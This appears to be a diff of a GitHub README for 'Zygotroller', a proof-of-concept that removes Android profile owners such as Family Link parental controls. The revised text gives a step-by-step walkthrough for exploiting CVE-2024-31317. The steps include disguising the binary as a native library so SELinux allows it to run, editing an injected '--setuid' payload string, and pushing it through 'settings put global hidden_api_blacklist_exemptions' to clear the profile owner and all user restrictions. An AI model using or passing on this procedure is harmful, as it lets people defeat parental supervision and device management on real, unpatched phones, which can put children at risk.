@@ -1,12 +1,9 @@
 # Zygotroller
-## Remove profile owners/Family Link on any pre June 2024 device, with Developer Mode
-Zygotroller is a proof-of-concept that shows how to remove an Android profile owner (used for parental controls or MDM) if you can become the user of the profile owner, for example, with CVE-2024-31317's Zygote injection bug, or Magisk.
+## Remove profile owners/Family Link on ANY pre June 2024 Developer Mode device (Android 12+)
+Zygotroller is a proof-of-concept that can remove a profile owner and associated restrictions with CVE-2024-31317's Zygote injection bug.
+It requires developer mode and the latest security patch to be prior to June 2024.
 
 Google's parental control system, Family Link, is shown as an example in this repo.
-
-I won't be including how to use this with CVE-2024-31317 here because it doesn't fall under the scope of this guide. If you are interested in using this in a real world scenario, I recommend you take a look at [this repo](https://github.com/agg23/cve-2024-31317) for some blogs and details regarding how to use that CVE. At a high level, you need to rename the Zygotroll binary to `libSOMETHING.so` (replacing 'SOMETHING' with whatever you want), and include it in an APK so that SELinux allows the file to be executed. You will need developer mode+app installs enabled if planning on using this in a real world scenario.
-
-The rest of the guide will assume you are using a rooted, supervised device with magisk. If you are not rooted, look into CVE-2024-31317.
 
 # Using
 You will need a modern-ish device running a Debian based distro to compile Zygotroller. Prebuilts may or may not be available depending on the time of reading this.
@@ -32,7 +29,7 @@ cd ~/aosp
 
 `source build/envsetup.sh`
 
-`aosp_cf_x86_64_only_phone-aosp_current-eng` (if not compiling for emulator, change to use the arm version)
+`lunch aosp_cf_arm64-v8a_only_phone-aosp_current-eng` (if you're testing this on an emulator, change arm64-v8a to x86_64)
 
 `cd ~/aosp/external`
 
@@ -65,6 +62,12 @@ The number you see in the output will be the opcode for clearprofile owner, open
     dpm->transact(91, data, &reply);
 ```
 
+You'll want to do the same thing with setUserRestriction:
+```
+// Transaction code 132 was setUserRestriction for my device
+dpm->transact(132, data2, &reply2);
+```
+
 Now we need to compile zygotroller:
 
 `mm`
@@ -73,21 +76,50 @@ This can take a LONG time on initial build, subsequent builds will take <1m on m
 
 Find your binary in `~/aosp/out/target/product/vsoc_x86_64_only/system/bin/zygotroller`
 
-Push this to your device: `adb push ~/aosp/out/target/product/vsoc_x86_64_only/system/bin/zygotroller /data/local/tmp`
+Now we need to make an app that contains this binary as a "shared library" that is actually just the Zygotroller executable, so SELinux lets us execute it.
+You can use my "CopyNativeLib" repo for that:
 
-Set correct permissions `adb shell chmod +x /data/local/tmp/zygotroller`.
+`git clone https://github.com/rifting/CopyNativeLib.git`
+
+Then rename your Zygotroller binary to `libzygotroller.so` and put it in app/src/main/jniLibs/arm64-v8a (I'm assuming that will be the architecture of your phone). Build the APK in android studio and install to your device with `adb install`.
 
 The family link profile owner was userid 10090 for me, AKA u0_a90
 Do `dumpsys package com.google.android.gms.supervision | grep userId=`
 
-Now switch to that user with something like Magisk or CVE-2024-31317. The username will be "u0_" + the last 2 numbers you got from the user id.
+Now take a look at payload.sh, on this line
 
-Example for magisk: `su u0_a90` (your username may or may not be different, make sure to replace mine with the correct one!)
+`inject='\n--setuid=10090...`
 
-Now run Zygotroller!
-`/data/local/tmp/zygotroller`
+Change the UID here from 10090 to whatever your UID from the dumpsys command was. If it's the same ID, leave it.
 
-You should see that the Family Link profile owner has been removed.
+Look a little further on that line and you'll see 
+
+`...echo zYg0te $(LD_LIBRARY_PATH=[path to your native lib] [path to your native lib])...`
+
+(three dots used to show truncation)
+
+You need to replace these with the paths to the native library you've just installed to the device. Run `pm path com.rifting.copynativelib`.
+The path to the file will be the parent directory of the APK shown as the output of the command, + `lib/arm64-v8a/libzygotroller.so`. So that line will end up looking something like this:
+
+`...echo zYg0te $(LD_LIBRARY_PATH=/data/app/~~IQhIf-M_9eLGoJ-Wd-qaCA==/com.rifting.copynativelib-a6N1upfA-_Trjh_cPCHngA==/lib/x86_64/ /data/app/~~IQhIf-M_9eLGoJ-Wd-qaCA==/com.rifting.copynativelib-a6N1upfA-_Trjh_cPCHngA==/lib/x86_64/libreal.so)...`
+
+You're almost there! Push this file to /data/local/tmp
+
+`adb push payload.sh /data/local/tmp`
+
+Set permissions:
+
+`chmod +x /data/local/tmp/payload.sh`
+
+And finally, send its output into hidden_api_blacklist_exemptions!
+
+`settings put global hidden_api_blacklist_exemptions "$(sh ./payload.sh)"`
+
+Now set this to "0" to avoid a bootloop :)
+`settings put global hidden_api_blacklist_exemptions 0`
+
+You should see that the Family Link profile owner + all associated restrictions have been removed.
+Go into settings and manage accounts, and remove the supervised account from the device. Congratulations!
 
 Before:
 ```
@@ -122,3 +154,5 @@ $ abx2xml /data/system/users/0.xml -
 
 ## Special Thanks
 [gburca for BinderDemo](https://github.com/gburca/BinderDemo)
+
+[LLeaves' awesome blog about this CVE](https://blog.lleavesg.top/article/CVE-2024-31317-Zygote)
